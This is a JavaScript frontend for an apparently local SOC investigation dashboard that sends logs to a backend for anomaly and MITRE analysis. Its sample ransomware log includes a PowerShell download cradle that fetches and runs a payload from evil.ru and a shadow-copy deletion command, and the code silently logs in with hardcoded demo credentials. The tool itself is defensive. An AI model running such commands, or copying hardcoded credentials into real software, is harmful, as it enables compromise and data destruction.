/* ═════════════════════════════════════════════════════════════
   SOC ANALYST TERMINAL — Frontend Logic
   Connects to FastAPI at http://localhost:8000
   Renders full pipeline output: anomaly, threat intel,
   attack graph, MITRE techniques, LLM explanation + actions.
═════════════════════════════════════════════════════════════ */

const API = 'http://localhost:8000';
const TIMEOUT_MS = 300_000; // 5 minutes

/* ─── JWT Token Management (Silent Background) ─────────────── */
let authToken = localStorage.getItem('authToken') || null;

function getAuthHeaders() {
  if (!authToken) return { 'Content-Type': 'application/json' };
  return {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${authToken}`
  };
}

async function silentLogin() {
  // Auto-login with demo credentials in background
  try {
    const res = await fetch(`${API}/auth/token`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: "analyst", password: "password123" })
    });
    
    if (res.ok) {
      const data = await res.json();
      authToken = data.access_token;
      localStorage.setItem('authToken', authToken);
      return true;
    }
  } catch (err) {
    // Silent fail - continue anyway
  }
  return false;
}

function isAuthenticated() {
  return authToken !== null;
}

/* ─── Scenario presets ──────────────────────────────────────── */
const SCENARIOS = {
  bruteforce:
`2024-01-15 03:22:11 Failed password for admin from 185.220.101.5 port 54231 ssh2
2024-01-15 03:22:14 Failed password for admin from 185.220.101.5 port 54234 ssh2
2024-01-15 03:22:17 Failed password for root from 185.220.101.5 port 54237 ssh2
2024-01-15 03:22:20 Failed password for ubuntu from 185.220.101.5 port 54240 ssh2
2024-01-15 03:22:23 Failed password for administrator from 185.220.101.5 port 54243 ssh2
2024-01-15 03:22:31 Accepted password for admin from 185.220.101.5 port 54251 ssh2
2024-01-15 03:22:31 pam_unix(sshd:session): session opened for user admin by (uid=0)
2024-01-15 03:22:45 sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
2024-01-15 03:23:10 Suspicious process: mimikatz executed as root (hash: d38e2f6b...)`,

  lateral:
`2024-01-15 09:14:03 User jsmith authenticated to WORKSTATION-01 via NTLM
2024-01-15 09:14:45 PsExec executed on FILESERVER-02 from WORKSTATION-01 by jsmith
2024-01-15 09:15:12 Net use \\\\FILESERVER-02\\ADMIN$ established from WORKSTATION-01
2024-01-15 09:15:20 cmd.exe launched as SYSTEM on FILESERVER-02 remotely
2024-01-15 09:16:05 Mimikatz process detected on FILESERVER-02 (hash: d38e2f6b...)
2024-01-15 09:16:40 LSASS memory access by non-system process on FILESERVER-02
2024-01-15 09:17:10 Pass-the-hash attempt to DC-01 from FILESERVER-02 using administrator hash
2024-01-15 09:17:55 Successful authentication to DC-01 from FILESERVER-02 (NTLM, administrator)`,

  exfil:
`2024-01-15 14:30:01 Large file transfer initiated from 192.168.1.105 to 45.33.32.156
2024-01-15 14:30:15 DNS query storm: 192.168.1.105 querying suspicious.exfil-domain.ru
2024-01-15 14:31:00 Outbound traffic spike: 2.4 GB via port 443 to 45.33.32.156 in 60 seconds
2024-01-15 14:32:10 7zip compression of /var/data/customers/ detected on 192.168.1.105
2024-01-15 14:32:45 Encrypted archive uploaded via HTTPS to cloud storage (45.33.32.156)
2024-01-15 14:33:20 Base64-encoded payloads in DNS TXT records from 192.168.1.105
2024-01-15 14:34:55 DLP alert: PII data pattern matched in outbound traffic from 192.168.1.105`,

  ransomware:
`2024-01-15 22:01:05 Suspicious macro execution in Word document: invoice_Q4.docm
2024-01-15 22:01:10 PowerShell.exe spawned by WINWORD.EXE (parent PID 4832)
2024-01-15 22:01:15 PowerShell download cradle: IEX(New-Object Net.WebClient).DownloadString('http://evil.ru/payload')
2024-01-15 22:01:22 C2 beacon established to 91.108.4.1:8080 from HOST-FINANCE-03
2024-01-15 22:02:00 Volume Shadow Copy deletion: vssadmin delete shadows /all /quiet
2024-01-15 22:02:10 Mass file rename detected: .docx -> .locked on FILESERVER-01 shares
2024-01-15 22:02:40 Backup service stopped: veeambackupsvc terminated by ransomware process
2024-01-15 22:03:00 README_DECRYPT.txt created in 1,452 directories on FILESERVER-01`,
};

/* ─── State ─────────────────────────────────────────────────── */
let activeScenario = null;
let elapsedTimer   = null;
let rawReport      = '';

/* ─── DOM refs ───────────────────────────────────────────────── */
const logInput  = document.getElementById('log-input');
const lineCount = document.getElementById('line-count');
const charCount = document.getElementById('char-count');
const runBtn    = document.getElementById('run-btn');
const runLabel  = document.getElementById('run-label');

/* ─── Clock ─────────────────────────────────────────────────── */
function updateClock() {
  const el = document.getElementById('clock');
  if (!el) return;
  const now = new Date();
  el.textContent = now.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
}
updateClock();
setInterval(updateClock, 1000);

/* ─── API health check ───────────────────────────────────────── */
async function checkAPI() {
  const chip = document.getElementById('api-status');
  const txt  = document.getElementById('status-text');
  
  if (!chip || !txt) return false;
  
  try {
    const res = await fetch(`${API}/health`, { 
      signal: AbortSignal.timeout(3000),
      method: 'GET'
    });
    
    if (res.status === 200) {
      chip.classList.add('online');
      chip.classList.remove('offline');
      txt.textContent = 'API ONLINE';
      console.log('✅ API is online');
      return true;
    } else {
      throw new Error(`Status: ${res.status}`);
    }
  } catch (err) {
    console.log('❌ API check failed:', err.message);
    txt.textContent = 'API OFFLINE';
    chip.classList.remove('online');
    chip.classList.add('offline');
    return false;
  }
}

// Check API immediately on load
async function initAPI() {
  console.log('Checking API status...');
  const isOnline = await checkAPI();
  if (isOnline) {
    feedEntry('API connected — http://localhost:8000', 'feed-ok');
  } else {
    feedEntry('API offline — start uvicorn on port 8000', 'feed-warn');
  }
  
  // Then check periodically every 5 seconds
  setInterval(checkAPI, 5000);
}

/* ─── Detection log feed ─────────────────────────────────────── */
function feedEntry(text, cls = 'feed-info') {
  const feed = document.getElementById('feed');
  if (!feed) return;
  const el = document.createElement('div');
  el.className = `feed-entry ${cls}`;
  const ts = new Date().toISOString().slice(11, 19);
  el.textContent = `${ts}  ${text}`;
  feed.appendChild(el);
  feed.scrollTop = feed.scrollHeight;
  // Keep feed lean
  while (feed.children.length > 80) feed.removeChild(feed.firstChild);
}

function clearLog() {
  const feed = document.getElementById('feed');
  if (feed) feed.innerHTML = '';
}

/* ─── Char / line counter ────────────────────────────────────── */
logInput.addEventListener('input', updateCounts);

function updateCounts() {
  const val = logInput.value;
  const lines = val ? val.split('\n').length : 0;
  lineCount.textContent = `${lines} line${lines !== 1 ? 's' : ''}`;
  charCount.textContent = `${val.length.toLocaleString()} chars`;
}

/* ─── Scenario loader ────────────────────────────────────────── */
function loadScenario(name) {
  // toggle off
  if (activeScenario === name) {
    logInput.value = '';
    updateCounts();
    document.getElementById(`s-${name}`)?.classList.remove('active');
    activeScenario = null;
    feedEntry(`Scenario cleared: ${name}`, 'feed-info');
    return;
  }

  // deactivate previous
  if (activeScenario) {
    document.getElementById(`s-${activeScenario}`)?.classList.remove('active');
  }

  logInput.value = SCENARIOS[name] || '';
  updateCounts();
  document.getElementById(`s-${name}`)?.classList.add('active');
  activeScenario = name;
  feedEntry(`Loaded scenario: ${name.toUpperCase()}`, 'feed-info');
}

/* ─── Clear input ────────────────────────────────────────────── */
function clearInput() {
  logInput.value = '';
  updateCounts();
  if (activeScenario) {
    document.getElementById(`s-${activeScenario}`)?.classList.remove('active');
    activeScenario = null;
  }
  // Clear filename display
  const fn = document.getElementById('t-filename');
  if (fn) fn.textContent = '';
  feedEntry('Input cleared', 'feed-sys');
}

/* ─── File Upload (button) ───────────────────────────────────── */
function handleFileUpload(event) {
  const file = event.target.files?.[0];
  if (!file) return;
  loadFileContent(file);
  // Reset input so same file can be re-selected
  event.target.value = '';
}

function loadFileContent(file) {
  const MAX_BYTES = 512_000; // 512 KB sanity cap
  if (file.size > MAX_BYTES) {
    feedEntry(`File too large (${(file.size / 1024).toFixed(0)} KB) — showing first 512 KB`, 'feed-warn');
  }

  const reader = new FileReader();

  reader.onload = (e) => {
    let text = e.target.result;
    const name = file.name.toLowerCase();

    if (name.endsWith('.csv')) {
      // Convert CSV to readable log text
      text = parseCSV(text);
      feedEntry(`CSV parsed → ${text.split('\n').length} log lines`, 'feed-ok');
    } else {
      feedEntry(`Loaded: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`, 'feed-ok');
    }

    setFileInTerminal(text, file.name);
  };

  reader.onerror = () => {
    feedEntry(`Failed to read file: ${file.name}`, 'feed-err');
  };

  // Read as text (limit to MAX_BYTES for large files)
  reader.readAsText(file.slice(0, MAX_BYTES));
}

function setFileInTerminal(text, filename) {
  // Deactivate any loaded scenario
  if (activeScenario) {
    document.getElementById(`s-${activeScenario}`)?.classList.remove('active');
    activeScenario = null;
  }

  logInput.value = text;
  updateCounts();

  // Show filename in terminal chrome
  const fn = document.getElementById('t-filename');
  if (fn) fn.textContent = filename;
}

/* ─── CSV Parser ─────────────────────────────────────────────── */
/*
  Converts CSV rows into plain-text log lines the pipeline can parse.

  Strategy:
  1. Read the header row to understand column names
  2. Look for columns that match common log field names
     (timestamp, message, event, description, severity, source, etc.)
  3. For each data row, build a one-line string: "col: value  col: value …"
  This gives the normalizer / event extractor enough raw text to work with.
*/
function parseCSV(csvText) {
  const lines = csvText.split(/\r?\n/).filter(l => l.trim());
  if (lines.length < 2) return csvText; // Not enough rows

  // Parse a single CSV row respecting quoted fields
  function parseRow(line) {
    const fields = [];
    let cur = '', inQ = false;
    for (let i = 0; i < line.length; i++) {
      const c = line[i];
      if (c === '"') { inQ = !inQ; }
      else if (c === ',' && !inQ) { fields.push(cur.trim()); cur = ''; }
      else { cur += c; }
    }
    fields.push(cur.trim());
    return fields;
  }

  const headers = parseRow(lines[0]).map(h => h.replace(/^"|"$/g, '').toLowerCase());

  // High-value columns to include (pattern matching)
  const IMPORTANT = [
    /time|date|ts/,
    /message|msg|description|detail|event/,
    /source|src|origin|host|hostname|computer/,
    /ip|address|addr|remote/,
    /user|account|principal|logon/,
    /action|activity|operation/,
    /severity|level|priority/,
    /process|command|cmdline|executable/,
  ];

  // Pick column indices that match at least one important pattern
  const keepIdx = headers.reduce((acc, h, i) => {
    if (IMPORTANT.some(rx => rx.test(h))) acc.push(i);
    return acc;
  }, []);

  // If no columns matched, just include all columns
  const idxList = keepIdx.length > 0 ? keepIdx : headers.map((_, i) => i);

  const outputLines = lines.slice(1).map(line => {
    const row = parseRow(line);
    return idxList
      .map(i => {
        const val = (row[i] || '').replace(/^"|"$/g, '').trim();
        return val ? `${headers[i]}: ${val}` : null;
      })
      .filter(Boolean)
      .join('  ');
  }).filter(l => l.length > 0);

  return outputLines.join('\n');
}

/* ─── Drag and Drop ─────────────────────────────────────────── */
(function initDragDrop() {
  const dropZone = document.getElementById('drop-zone');
  // Use the left column as the drag target area
  const leftCol  = document.querySelector('.col-left');
  if (!leftCol || !dropZone) return;

  let dragCounter = 0; // track nested dragenter/dragleave pairs

  leftCol.addEventListener('dragenter', (e) => {
    e.preventDefault();
    dragCounter++;
    dropZone.classList.add('active');
    logInput.classList.add('drag-over');
  });

  leftCol.addEventListener('dragleave', (e) => {
    dragCounter--;
    if (dragCounter <= 0) {
      dragCounter = 0;
      dropZone.classList.remove('active');
      logInput.classList.remove('drag-over');
    }
  });

  leftCol.addEventListener('dragover', (e) => {
    e.preventDefault(); // required to allow drop
  });

  leftCol.addEventListener('drop', (e) => {
    e.preventDefault();
    dragCounter = 0;
    dropZone.classList.remove('active');
    logInput.classList.remove('drag-over');

    const file = e.dataTransfer?.files?.[0];
    if (!file) return;

    const allowed = ['.log', '.txt', '.csv', '.json'];
    const ext = '.' + file.name.split('.').pop().toLowerCase();

    if (!allowed.includes(ext)) {
      feedEntry(`Unsupported file type: ${ext}. Use .log .txt .csv .json`, 'feed-warn');
      return;
    }

    loadFileContent(file);
  });
})();

/* ─── UI state switches ──────────────────────────────────────── */
const STATES = ['empty-state', 'loading-state', 'error-state', 'report'];

function showState(id) {
  STATES.forEach(s => {
    const el = document.getElementById(s);
    if (!el) return;
    el.classList.toggle('hidden', s !== id);
  });
}

/* ─── Pipeline step animation ────────────────────────────────── */
const STEP_DELAYS = [600, 1200, 2200, 3000, 4000, 6000, 9000];
const STEP_LABELS = ['PARSE', 'EXTRACT', 'LSTM', 'INTEL', 'RAG', 'LLM…', 'GRAPH'];

function startPipelineAnimation() {
  // Reset all steps
  for (let i = 0; i < 7; i++) {
    const el = document.getElementById(`ps-${i}`);
    if (el) {
      el.className = 'pipe-step';
      el.querySelector('.pipe-status').textContent = '';
    }
  }

  for (let i = 0; i < 7; i++) {
    const delay = STEP_DELAYS[i];
    setTimeout(() => {
      // mark previous as done
      if (i > 0) {
        const prev = document.getElementById(`ps-${i - 1}`);
        if (prev) {
          prev.className = 'pipe-step ps-done';
          prev.querySelector('.pipe-status').textContent = 'DONE';
        }
      }
      // mark current as active
      const cur = document.getElementById(`ps-${i}`);
      if (cur) {
        cur.className = 'pipe-step ps-active';
        cur.querySelector('.pipe-status').textContent = STEP_LABELS[i];
      }
    }, delay);
  }
}

function finishPipelineAnimation() {
  for (let i = 0; i < 7; i++) {
    const el = document.getElementById(`ps-${i}`);
    if (el) {
      el.className = 'pipe-step ps-done';
      el.querySelector('.pipe-status').textContent = 'DONE';
    }
  }
}

/* ─── Elapsed timer ──────────────────────────────────────────── */
function startElapsed() {
  let s = 0;
  const el = document.getElementById('elapsed-val');
  stopElapsed();
  elapsedTimer = setInterval(() => {
    s++;
    if (el) el.textContent = `${s}s`;
  }, 1000);
}

function stopElapsed() {
  if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
}

/* ─── Main investigation ─────────────────────────────────────── */
async function investigate() {
  const logs = logInput.value.trim();
  if (!logs) {
    logInput.focus();
    logInput.style.outline = '1px solid var(--red)';
    setTimeout(() => { logInput.style.outline = ''; }, 1200);
    feedEntry('No log input provided', 'feed-warn');
    return;
  }

  // Disable button
  runBtn.disabled = true;
  runLabel.textContent = 'RUNNING…';

  showState('loading-state');
  startPipelineAnimation();
  startElapsed();

  feedEntry('Investigation started', 'feed-info');
  feedEntry(`Input: ${logs.split('\n').length} lines`, 'feed-info');

  const ctrl    = new AbortController();
  const timeout = setTimeout(() => ctrl.abort(), TIMEOUT_MS);

  try {
    const res = await fetch(`${API}/investigate`, {
      method:  'POST',
      headers: getAuthHeaders(),
      body:    JSON.stringify({ logs }),
      signal:  ctrl.signal,
    });

    clearTimeout(timeout);

    if (!res.ok) {
      if (res.status === 401 || res.status === 403) {
        feedEntry('Authentication expired. Retrying...', 'feed-warn');
        await silentLogin();
        // Retry with new token
        const retryRes = await fetch(`${API}/investigate`, {
          method:  'POST',
          headers: getAuthHeaders(),
          body:    JSON.stringify({ logs }),
          signal:  ctrl.signal,
        });
        
        if (!retryRes.ok) {
          throw new Error(`Authentication failed: ${retryRes.status}`);
        }
        
        const data = await retryRes.json();
        finishPipelineAnimation();
        rawReport = data.investigation || data.llm_explanation || '';
        renderReport(data);
        showState('report');
        document.getElementById('api-status')?.classList.add('online');
        document.getElementById('status-text').textContent = 'API ONLINE';
        feedEntry(`Investigation complete — severity: ${data.severity || '?'}`, 'feed-ok');
        return;
      }
      const err = await res.json().catch(() => ({}));
      throw new Error(err.detail || `HTTP ${res.status}`);
    }

    const data = await res.json();
    finishPipelineAnimation();
    rawReport = data.investigation || data.llm_explanation || '';
    renderReport(data);
    showState('report');

    // Mark API online after a successful call
    document.getElementById('api-status')?.classList.add('online');
    document.getElementById('status-text').textContent = 'API ONLINE';
    feedEntry(`Investigation complete — severity: ${data.severity || '?'}`, 'feed-ok');

  } catch (err) {
    clearTimeout(timeout);
    let msg;
    if (err.name === 'AbortError') {
      msg = 'Request timed out after 5 minutes. The local LLM might be generating slowly on your hardware — please retry.';
      feedEntry('Request timed out', 'feed-err');
    } else if (/fetch|failed to fetch/i.test(err.message)) {
      msg = 'Cannot reach backend API. Make sure uvicorn is running on port 8000.';
      feedEntry('Cannot reach API', 'feed-err');
    } else {
      msg = err.message;
      feedEntry(`Error: ${err.message}`, 'feed-err');
    }
    document.getElementById('error-msg').textContent = msg;
    showState('error-state');
  } finally {
    stopElapsed();
    runBtn.disabled  = false;
    runLabel.textContent = 'RUN INVESTIGATION';
  }
}

/* ─── Report rendering ───────────────────────────────────────── */
function renderReport(data) {
  /* ── Top bar ── */
  document.getElementById('report-id').textContent =
    `INC-${(data.incident_id || '').slice(0, 8).toUpperCase()}`;
  document.getElementById('report-ts').textContent =
    data.timestamp ? new Date(data.timestamp).toUTCString() : '—';

  const sev = (data.severity || 'UNKNOWN').toUpperCase();
  const pill = document.getElementById('severity-pill');
  pill.textContent = sev;
  pill.className   = `severity-pill sev-${sev}`;

  /* ── Metric strip ── */
  const anomaly = typeof data.anomaly_score === 'number' ? data.anomaly_score : null;
  if (anomaly !== null) {
    document.getElementById('m-anomaly').textContent = anomaly.toFixed(3);
    setBar('m-anomaly-bar', anomaly * 100, severityColor(anomaly, 'anomaly'));
    feedEntry(`Anomaly score: ${anomaly.toFixed(4)}`,
      anomaly >= 0.7 ? 'feed-err' : anomaly >= 0.4 ? 'feed-warn' : 'feed-ok');
  }

  const conf = typeof data.confidence === 'number' ? data.confidence : null;
  if (conf !== null) {
    document.getElementById('m-confidence').textContent = `${(conf * 100).toFixed(0)}%`;
    setBar('m-confidence-bar', conf * 100, '#4a90d9');
  }

  const tiRisk = data.threat_intel?.overall_risk || '—';
  document.getElementById('m-risk').textContent = tiRisk;
  if (tiRisk !== '—') {
    const riskColors = { CRITICAL: 'var(--red)', HIGH: 'var(--amber)', MEDIUM: 'var(--blue)', LOW: 'var(--green)' };
    document.getElementById('m-risk').style.color = riskColors[tiRisk] || '';
    feedEntry(`Threat intel risk: ${tiRisk}`,
      tiRisk === 'CRITICAL' || tiRisk === 'HIGH' ? 'feed-err' : 'feed-info');
  }

  document.getElementById('m-events').textContent   = data.events_analyzed ?? '—';
  document.getElementById('m-sessions').textContent = data.session_count ?? '—';

  /* ── Kill chain ── */
  const kc = data.kill_chain_stage || data.attack_stage || '—';
  document.getElementById('r-killchain').textContent = kc;
  feedEntry(`Kill-chain stage: ${kc}`, 'feed-found');

  /* ── MITRE techniques ── */
  const techniques = data.mitre_techniques || [];
  const mitreEl = document.getElementById('r-mitre');
  if (techniques.length > 0 && techniques[0] !== 'Unknown') {
    mitreEl.innerHTML = techniques.map(t =>
      `<span class="mitre-tag">${esc(t)}</span>`
    ).join('');
    feedEntry(`MITRE: ${techniques.join(', ')}`, 'feed-found');
  } else {
    mitreEl.textContent = '—';
  }

  /* ── Attack graph ── */
  const graph  = data.attack_graph || {};
  const path   = graph.attack_path || [];
  const graphEl = document.getElementById('r-graph');
  if (path.length > 0) {
    const nodes = path.map(n => `<span class="graph-node">${esc(n)}</span>`);
    const withArrows = nodes.join('<span class="graph-arrow">→</span>');
    graphEl.innerHTML = `<div class="graph-path">${withArrows}</div>`;
    if (graph.stages?.length > 0) {
      const stageDiv = document.createElement('div');
      stageDiv.style.cssText = 'font-size:0.68rem;color:var(--text-2);margin-top:6px;';
      stageDiv.textContent = graph.stages.join(' → ');
      graphEl.appendChild(stageDiv);
    }
  } else {
    graphEl.textContent = '—';
  }

  /* ── Threat intel ── */
  const indicators = data.threat_intel?.indicators || [];
  const intelEl = document.getElementById('r-intel');
  const malicious = indicators.filter(i => i.is_malicious);

  if (malicious.length > 0) {
    intelEl.innerHTML = malicious.slice(0, 6).map(i => {
      const typeClass = { ip: 'ib-ip', command: 'ib-command', hash: 'ib-hash' }[i.indicator_type] || 'ib-ip';
      return `<div class="intel-entry">
        <span class="intel-badge ${typeClass}">${esc(i.indicator_type.toUpperCase())}</span>
        <span class="intel-text">${esc(i.indicator)}<br><small style="color:var(--text-2)">${esc(i.threat_description || '')}</small></span>
        <span class="intel-risk">${i.risk_score}/100</span>
      </div>`;
    }).join('');
    feedEntry(`${malicious.length} malicious indicator(s) found`, 'feed-err');
  } else {
    intelEl.textContent = 'No malicious indicators detected.';
    feedEntry('No malicious indicators detected', 'feed-ok');
  }

  /* ── RAG Knowledge Snippets ── */
  const ragEl      = document.getElementById('r-rag');
  const ragSnippets = data.rag_snippets || [];
  const ragQuery    = data.rag_query || '';

  if (ragSnippets.length > 0) {
    let html = '';
    
    // Show the RAG query used
    if (ragQuery) {
      html += `<div class="rag-query">
        <span class="rag-query-label">Query:</span>
        <span class="rag-query-text">${esc(ragQuery)}</span>
      </div>`;
    }
    
    // Show retrieved snippets with enhanced parsing
    html += '<div class="rag-snippets-container">';
    ragSnippets.slice(0, 5).forEach((snippet, i) => {
      // Extract Technique ID and Name
      const techIdMatch = snippet.match(/Technique ID:\s*([T\d.]+)/);
      const techNameMatch = snippet.match(/Technique Name:\s*([^\n]+)/);
      const tacticsMatch = snippet.match(/Tactics:\s*([^\n]+)/);
      const descMatch = snippet.match(/Description:\s*([\s\S]*?)(?:Technique ID:|$)/);
      
      const techId = techIdMatch ? techIdMatch[1] : '';
      const techName = techNameMatch ? techNameMatch[1].trim() : '';
      const tactics = tacticsMatch ? tacticsMatch[1].trim().split(',').map(t => t.trim()) : [];
      const description = descMatch ? descMatch[1].trim().slice(0, 200) : snippet.slice(0, 200);
      
      html += `<div class="rag-snippet" data-index="${i}">
        <span class="rag-snippet-num">${i + 1}</span>
        <div class="rag-snippet-content">
          ${techId ? `<div class="rag-technique-id">${esc(techId)}</div>` : ''}
          ${techName ? `<div class="rag-technique-name">${esc(techName)}</div>` : ''}
          ${tactics.length > 0 ? `<div class="rag-tactics">${tactics.map(t => `<span class="rag-tactic">${esc(t)}</span>`).join('')}</div>` : ''}
          <div class="rag-description">${esc(description)}${description.length > 200 ? '…' : ''}</div>
        </div>
      </div>`;
    });
    html += '</div>';
    
    ragEl.innerHTML = html;
    feedEntry(`RAG: ${ragSnippets.length} MITRE ATT&CK passage(s) retrieved`, 'feed-found');
  } else {
    ragEl.innerHTML = '<span style="color:var(--text-2)">No MITRE ATT&CK passages retrieved.</span>';
    feedEntry('RAG: no passages retrieved', 'feed-warn');
  }

  /* ── LLM Explanation ── */
  const raw = data.llm_explanation || data.investigation || '';
  const explEl = document.getElementById('r-explanation');
  const explanation = extractSection(raw, 'explanation') || raw;
  explEl.innerHTML = `<div class="explanation-text">${formatText(explanation)}</div>`;

  /* ── Recommended response ── */
  const actions = data.recommended_response || [];
  const respEl  = document.getElementById('r-response');
  if (actions.length > 0) {
    respEl.innerHTML = actions.map((a, i) =>
      `<div class="response-item">
        <span class="response-num">${String(i + 1).padStart(2, '0')}</span>
        <span>${esc(a)}</span>
      </div>`
    ).join('');
  } else {
    // Try extracting from raw LLM output
    const rawActions = extractSection(raw, 'recommended_actions');
    if (rawActions) {
      const lines = rawActions.split('\n')
        .map(l => l.replace(/^[\s\*\-•\d\.)]+/, '').trim())
        .filter(l => l.length > 5);
      respEl.innerHTML = lines.slice(0, 8).map((a, i) =>
        `<div class="response-item">
          <span class="response-num">${String(i + 1).padStart(2, '0')}</span>
          <span>${esc(a)}</span>
        </div>`
      ).join('');
    } else {
      respEl.textContent = 'No specific actions returned.';
    }
  }

  /* ── Raw output ── */
  document.getElementById('raw-body').textContent = raw;
}

/* ─── Helpers ─────────────────────────────────────────────────── */
function setBar(id, pct, color) {
  const el = document.getElementById(id);
  if (!el) return;
  el.style.width = `${Math.min(pct, 100).toFixed(1)}%`;
  el.style.background = color;
}

function severityColor(score, type) {
  if (score >= 0.8) return 'var(--red)';
  if (score >= 0.5) return 'var(--amber)';
  if (score >= 0.2) return 'var(--blue)';
  return 'var(--green)';
}

function extractSection(text, sectionName) {
  const pattern = new RegExp(
    `(?:^|\\n)[\\s\\*-]*${sectionName.replace(/_/g, '[_\\s]?')}[:\\s]+([\\s\\S]*?)(?=\\n[\\s\\*-]*(?:attack[_\\s]stage|mitre[_\\s]technique|severity|confidence|explanation|recommended[_\\s]actions)[:\\s]|$)`,
    'im'
  );
  const m = text.match(pattern);
  return m ? m[1].trim() : null;
}

function formatText(text) {
  if (!text) return '<em style="color:var(--text-2)">Not available.</em>';
  // Strip markdown bold
  text = text.replace(/\*\*(.*?)\*\*/g, '$1');
  // Convert bullet lines to HTML list
  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
  if (lines.length <= 1) return `<p>${esc(text.trim())}</p>`;
  const isList = lines.every(l => /^[-•*\d.]/.test(l));
  if (isList) {
    const items = lines.map(l => l.replace(/^[-•*\d\.)]+\s*/, '').trim()).filter(Boolean);
    return `<ul>${items.map(i => `<li>${esc(i)}</li>`).join('')}</ul>`;
  }
  return lines.map(l => `<p>${esc(l)}</p>`).join('');
}

function esc(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/* ─── Copy report ─────────────────────────────────────────────── */
function copyReport() {
  if (!rawReport) return;
  navigator.clipboard.writeText(rawReport).then(() => {
    const btn = document.getElementById('copy-btn');
    if (!btn) return;
    const orig = btn.innerHTML;
    btn.textContent = 'COPIED';
    btn.style.color = 'var(--green)';
    setTimeout(() => {
      btn.innerHTML = orig;
      btn.style.color = '';
    }, 1800);
  });
}

/* ─── Keyboard shortcut (Enter to run) ──────────────────────── */
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
    e.preventDefault();
    if (!runBtn.disabled) investigate();
  }
});

/* ─── Init ────────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  updateCounts();
  initAPI();  // Check API status with logging
  
  // Silently login in background
  silentLogin();
  
  feedEntry('LSTM model: loaded', 'feed-ok');
  feedEntry('Ready — paste logs or select scenario', 'feed-sys');
});
